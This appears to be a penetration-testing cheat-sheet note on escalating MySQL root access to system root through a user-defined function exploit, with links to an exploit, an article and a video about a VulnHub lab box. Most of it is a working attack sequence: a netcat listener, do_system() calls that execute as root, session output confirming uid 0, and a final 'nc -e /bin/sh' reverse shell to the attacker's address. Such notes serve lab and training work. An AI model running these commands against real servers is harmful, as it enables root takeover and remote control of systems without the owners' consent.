# MySQL root Access  using User Defined Function (UDF)
if you have MySQL root access, try to do privilege escalation using MySQL:

Here is a nice exploit:
```
https://www.exploit-db.com/exploits/1518
```

Here is a nice article to do it:
```
https://medium.com/@dipanshuchhanikar/privilege-escalation-via-mysql-udf-exploit-a-step-by-step-guide-9b886c8b5560
```

OR YT Video (Using Rave-2 VulnHub Box):
```
https://www.youtube.com/watch?v=0lVZjYlmnQk @ 37:32
```


Once you uploaded the exploit and verified that you can execute commands as root, create a reverse shell.
On Kali, create a listener
```
nc -lnvp 9001
```

On the target box:
```
select do_system('id > /tmp/output; chown www-data www-data /tmp/output') 
+--------------------------------------------------------------------+
| do_system('id > /tmp/output; chown www-data www-data /tmp/output') |
+--------------------------------------------------------------------+
|                                                                  0 |
+--------------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> \! shell-command
sh: 1: shell-command: not found
mysql> \! sh
$ ls
out  output  raptor_udf2.so  tmux-33
$ cat output
uid=0(root) gid=0(root) groups=0(root)
$ which nc
/bin/nc
$ exit
mysql> select do_system('nc -e /bin/sh 10.50.10.254 9001');

```

The command "select do_system('nc -e /bin/sh 10.50.10.254 9001');" will execute a reverse shell using netcat from teh target box to your Kali box.